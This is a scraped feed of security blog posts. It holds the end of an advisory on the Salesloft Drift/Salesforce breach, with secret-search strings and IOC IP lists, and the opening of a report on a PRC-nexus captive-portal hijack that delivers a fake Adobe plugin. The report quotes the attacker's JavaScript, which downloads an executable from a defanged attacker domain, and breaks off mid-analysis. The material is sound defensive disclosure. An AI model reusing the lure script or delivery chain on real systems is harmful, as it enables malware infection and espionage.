style=\"vertical-align: baseline;\">Within each integrated third-party application, search for the IP addresses and User-Agent strings provided in the IOCs section below. While this list includes IPs from the Tor network that have been observed to date, Mandiant recommends a broader search for any activity originating from Tor exit nodes.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Review Salesforce Event Monitoring logs for unusual activity associated with the Drift connection user.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Review authentication activity from the Drift Connected App.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Review UniqueQuery events that log executed SOQL queries.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Open a Salesforce support case to obtain specific queries used by the threat actor.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Search Salesforce objects for potential secrets, such as:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">AKIA</code><span style=\"vertical-align: baseline;\"> for long-term AWS access key identifiers</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">Snowflake</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">snowflakecomputing.com</code><span style=\"vertical-align: baseline;\"> for Snowflake credentials</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">password</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">secret,key</code><span style=\"vertical-align: baseline;\"> to find potential references to credential material</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Strings related to organization-specific login URLs, such as VPN or SSO login pages</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Run tools like </span><a href=\"https://github.com/trufflesecurity/trufflehog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Trufflehog</span></a><span style=\"vertical-align: baseline;\"> to find secrets and hardcoded credentials.</span></p>\n</li>\n</ul>\n<p><span style=\"text-decoration: underline; vertical-align: baseline;\">Revoke and Rotate Credentials</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Within each integrated third-party application, </span><span style=\"vertical-align: baseline;\">revoke and rotate API keys, credentials. and authentication tokens associated with third-party application integrations with a Drift instance.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Immediately revoke and rotate any discovered keys or secrets.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Reset passwords for associated user accounts.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">For Salesforce integrations, configure session timeout values in </span><a href=\"https://help.salesforce.com/s/articleView?id=xcloud.admin_sessions.htm&amp;type=5\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Session Settings</span></a><span style=\"vertical-align: baseline;\"> to limit the lifespan of a compromised session.</span></p>\n</li>\n</ul>\n<p><span style=\"text-decoration: underline; vertical-align: baseline;\">Harden Access Controls</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://help.salesforce.com/s/articleView?id=xcloud.connected_app_create_api_integration.htm&amp;type=5\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Review and Restrict Connected App Scopes: </span></a><span style=\"vertical-align: baseline;\">Ensure that applications have the minimum necessary permissions and avoid overly permissive scopes like </span><code style=\"vertical-align: baseline;\">full</code><span style=\"vertical-align: baseline;\"> access.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://help.salesforce.com/s/articleView?id=xcloud.connected_app_continuous_ip.htm&amp;type=5\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Enforce IP Restrictions on the Connected App: </span></a><span style=\"vertical-align: baseline;\">In the app's settings, set the \"IP Relaxation\" policy to \"Enforce IP restrictions.\"</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://help.salesforce.com/s/articleView?id=platform.login_ip_ranges.htm&amp;language=en_US&amp;type=5\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Define Login IP Ranges: </span></a><span style=\"vertical-align: baseline;\">On user profiles, define IP ranges to only allow access from trusted networks.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Remove the \"API Enabled\" </span><a href=\"https://help.salesforce.com/s/articleView?language=en_US&amp;id=sf.perm_sets_create.htm&amp;type=5\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Permission</span></a><span style=\"vertical-align: baseline;\">: Remove the \"API Enabled\" permission from profiles and grant it only to authorized users via a Permission Set.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Additional instructions and updates are available on the </span><a href=\"https://trust.salesloft.com/?uid=Drift%2FSalesforce+Security+Notification\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Salesloft Trust Center</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://status.salesforce.com/generalmessages/20000217\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Salesforce advisory</span></a><span style=\"vertical-align: baseline;\">. </span></p>\n<h3><span style=\"vertical-align: baseline;\">Acknowledgments</span><strong style=\"vertical-align: baseline;\"> </strong></h3>\n<p><span style=\"vertical-align: baseline;\">We would like to thank Salesforce, Salesloft, and other trusted partners for their collaboration and assistance in responding to this threat.</span></p>\n<h3><span style=\"vertical-align: baseline;\">IOCs</span><strong style=\"vertical-align: baseline;\"> </strong></h3>\n<p><span style=\"vertical-align: baseline;\">The following indicators of compromise are available in a <a href=\"https://www.virustotal.com/gui/collection/cc8d746bdcff0383a7b52b5bae028bc45881f3722ebe19e99ef560267dc5dc75\" rel=\"noopener\" target=\"_blank\">Google Threat Intelligence (GTI) collection</a> for registered users</span><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table style=\"width: 99.3116%;\"><colgroup><col style=\"width: 53.7643%;\" /><col style=\"width: 46.1955%;\" /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">Indicator Value</span></strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">Description</span></strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Salesforce-Multi-Org-Fetcher/1.0</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Malicious User-Agent string</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Salesforce-CLI/1.0</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Malicious User-Agent string</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">python-requests/2.32.4</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">User-Agent string</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Python/3.11 aiohttp/3.12.15</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">User-Agent string</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">208.68.36.90</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DigitalOcean</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">44.215.108.109</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Amazon Web Services</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">154.41.95.2</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">176.65.149.100</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">179.43.159.198</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">185.130.47.58</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">185.207.107.130</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">185.220.101.133</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">185.220.101.143</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">185.220.101.164</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">185.220.101.167</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">185.220.101.169</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">185.220.101.180</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">185.220.101.185</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">185.220.101.33</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">192.42.116.179</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">192.42.116.20</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">194.15.36.117</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">195.47.238.178</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: bottom; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">195.47.238.83</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Tor exit node</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>"}
{"source": "Threat Intelligence", "title": "Deception in Depth: PRC-Nexus Espionage Campaign Hijacks Web Traffic to Target Diplomats", "link": "https://cloud.google.com/blog/topics/threat-intelligence/prc-nexus-espionage-targets-diplomats/", "published": "Mon, 25 Aug 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Patrick Whitsell</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In March 2025, Google Threat Intelligence Group (GTIG) identified a complex, multifaceted campaign attributed to the PRC-nexus threat actor UNC6384. The campaign targeted diplomats in Southeast Asia and other entities globally. GTIG assesses this was likely in support of cyber espionage operations aligned with the strategic interests of the People's Republic of China (PRC). </span></p>\n<p><span style=\"vertical-align: baseline;\">The campaign hijacks target web traffic, using a captive portal redirect, to deliver a digitally signed downloader that GTIG tracks as STATICPLUGIN. This ultimately led to the in-memory deployment of the backdoor SOGU.SEC (also known as PlugX). This multi-stage attack chain leverages advanced social engineering including valid code signing certificates, an adversary-in-the-middle (AitM) attack, and indirect execution techniques to evade detection.</span></p>\n<p><span style=\"vertical-align: baseline;\">Google is actively protecting our users and customers from this threat. We sent </span><a href=\"https://support.google.com/a/answer/9007870?hl=en\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">government-backed attacker alerts</span></a><span style=\"vertical-align: baseline;\"> to all Gmail and Workspace users impacted by this campaign. We encourage users to enable Enhanced Safe Browsing for Chrome, ensure all devices are fully updated, and enable 2-Step Verification on accounts. Additionally, all identified domains, URLs, and file hashes have been added to the Google </span><a href=\"https://safebrowsing.google.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Safe Browsing</span></a><span style=\"vertical-align: baseline;\"> list of unsafe web resources. </span><a href=\"https://cloud.google.com/security/products/security-operations\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Security Operations</span></a><span style=\"vertical-align: baseline;\"> (SecOps) has also been updated with relevant intelligence, enabling defenders to hunt for this activity in their environments.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Webinar: Defending Against Sophisticated and Evolving PRC-Nexus Espionage Campaigns&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f6997f55e20&gt;), (&#x27;btn_text&#x27;, &#x27;Register now&#x27;), (&#x27;href&#x27;, &#x27;https://www.brighttalk.com/webcast/7451/651182?utm_source=blog&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Overview</span></h3>\n<p><span style=\"vertical-align: baseline;\">This blog post presents our findings and analysis of this espionage campaign, as well as the evolution of the threat actor’s operational capabilities. We examine how the malware is delivered, how the threat actor utilized social engineering and evasion techniques, and technical aspects of the multi-stage malware payloads. </span></p>\n<p><span style=\"vertical-align: baseline;\">In this campaign, the malware payloads were disguised as either software or plugin updates and delivered through UNC6384 infrastructure using AitM and social engineering tactics. A high level overview of the attack chain: </span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The target’s web browser tests if the internet connection is behind a captive portal;</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">An AitM redirects the browser to a threat actor controlled website;</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The first stage malware, STATICPLUGIN, is downloaded;</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">STATICPLUGIN then retrieves an MSI package from the same website;</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Finally, CANONSTAGER is DLL side-loaded and deploys the SOGU.SEC backdoor.</span></p>\n</li>\n</ol></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Attack chain diagram\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/deception-in-depth-fig1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Attack chain diagram</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Malware Delivery: Captive Portal Hijack</span></h3>\n<p><span style=\"vertical-align: baseline;\">GTIG discovered evidence of a captive portal hijack being used to deliver malware disguised as an Adobe Plugin update to targeted entities. A captive portal is a network setup that directs users to a specific webpage, usually a login or splash page, before granting internet access. This functionality is intentionally built into all web browsers. The Chrome browser performs an HTTP request to a hardcoded URL (</span><code style=\"vertical-align: baseline;\">“http://www.gstatic.com/generate_204</code><span style=\"vertical-align: baseline;\">”) to enable this redirect mechanism.</span></p>\n<p><span style=\"vertical-align: baseline;\">While “</span><code style=\"vertical-align: baseline;\">gstatic.com</code><span style=\"vertical-align: baseline;\">” is a legitimate domain, our investigation uncovered redirect chains from this domain leading to the threat actor’s landing webpage and subsequent malware delivery, indicating an AitM attack. We assess the AitM was facilitated through compromised edge devices on the target networks. However, GTIG did not observe the attack vector used to compromise the edge devices.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Captive portal redirect chain\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/deception-in-depth-fig2.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2: Captive portal redirect chain</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Fake Plugin Update </span></h3>\n<p><span style=\"vertical-align: baseline;\">After being redirected, the threat actor attempts to deceive the target into believing that a software update is needed, and to download the malware disguised as a “plugin update”. The threat actor used multiple social engineering techniques to form a cohesive and credible update theme. </span></p>\n<p><span style=\"vertical-align: baseline;\">The landing webpage resembles a legitimate software update site and uses an HTTPS connection with a valid TLS certificate issued by Let’s Encrypt. The use of HTTPS offers several advantages for social engineering and malware delivery. Browser warning messages, such as “Not Secure” and “Your connection is not private”, will not be displayed to the target, and the connection to the website is encrypted, making it more difficult for network-based defenses to inspect and detect the malicious traffic. Additionally, the malware payload is disguised as legitimate software and is digitally signed with a certificate issued by a Certificate Authority.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>$ openssl x509 -in mediareleaseupdates.pem -noout -text -fingerprint -sha256\n\nCertificate:\n    Data:\n        Version: 3 (0x2)\n        Serial Number:\n            05:23:ee:fd:9f:a8:7d:10:b1:91:dc:34:dd:ee:1b:41:49:bd\n        Signature Algorithm: sha256WithRSAEncryption\n        Issuer: C=US, O=Let's Encrypt, CN=R10\n        Validity\n            Not Before: May 17 16:58:11 2025 GMT\n            Not After : Aug 15 16:58:10 2025 GMT\n        Subject: CN=mediareleaseupdates[.]com\n\nsha256 Fingerprint=6D:47:32:12:D0:CB:7A:B3:3A:73:88:07:74:5B:6C:F1:51:A2:B5:C3:31:65:67:74:DF:59:E1:A4:E2:23:04:68</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 3: Website TLS certificate</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The initial landing page is completely blank with a yellow bar across the top and a button that reads “</span><code style=\"vertical-align: baseline;\">Install Missing Plugins…</code><span style=\"vertical-align: baseline;\">”. If this technique successfully deceives the target into believing they need to install additional software, they may be more willing to manually bypass host-based Windows security protections to execute the delivered malicious payload.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Malware landing page\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/deception-in-depth-fig4.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4: Malware landing page</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In the background, Javascript code is loaded from a script file named “</span><code style=\"vertical-align: baseline;\">style3.js</code><span style=\"vertical-align: baseline;\">” hosted on the same domain as the HTML page. When the target clicks the install button “</span><code style=\"vertical-align: baseline;\">myFunction</code><span style=\"vertical-align: baseline;\">”, which is located in the loaded script, is executed.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>&lt;head&gt;\n\t&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt;\n\t&lt;title&gt;Additional plugins are required to display all the media on this page&lt;/title&gt;\n\n\t&lt;script type=\"text/javascript\" src=\"https[:]//mediareleaseupdates[.]com/style3.js\"&gt; &lt;/script&gt;\n\n&lt;/head&gt;\n&lt;body&gt;&lt;div id=\"adobe update\" onclick=\"myFunction()\"...</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 5: Javascript from </span><code style=\"vertical-align: baseline;\">AdobePlugins.html</code></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Inside of “</span><code style=\"vertical-align: baseline;\">myFunction</code><span style=\"vertical-align: baseline;\">” another image is loaded to display as the background image on the webpage. The browser window location is also set to the URL of an executable, again hosted on the same domain.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>function myFunction()\n{\n    var img = new Image();\n    img.src =\"data:image/png;base64,iVBORw0KGgo[cut]\n...\n    document.body.innerHTML = '';\n    document.body.style.backgroundImage = 'url(' + img.src + ')';\n... \n    window.location.href = \"https[:]//mediareleaseupdates[.]com/AdobePlugins.exe\";\n}</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 6: Javascript from </span><code style=\"vertical-align: baseline;\">style3.js</code></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This triggers the automatic download of “</span><code style=\"vertical-align: baseline;\">AdobePlugins.exe</code><span style=\"vertical-align: baseline;\">” and a new background image to be displayed on the webpage. The image shows instructions for how to execute the downloaded binary and bypass potential Windows security protections.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Malware landing page post-download\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/deception-in-depth-fig7.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 7: Malware landing page post-download</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">When the downloaded executable is run, the fake install prompt seen in the above screenshot for “STEP 2” is displayed on screen, along with “</span><code style=\"vertical-align: baseline;\">Install</code><span style=\"vertical-align: baseline;\">” and \"</span><code style=\"vertical-align: baseline;\">Cancel</code><span style=\"vertical-align: baseline;\">” options. However, the SOGU.SEC payload is likely already running on the target device, as neither button triggers any action relevant to the malware. 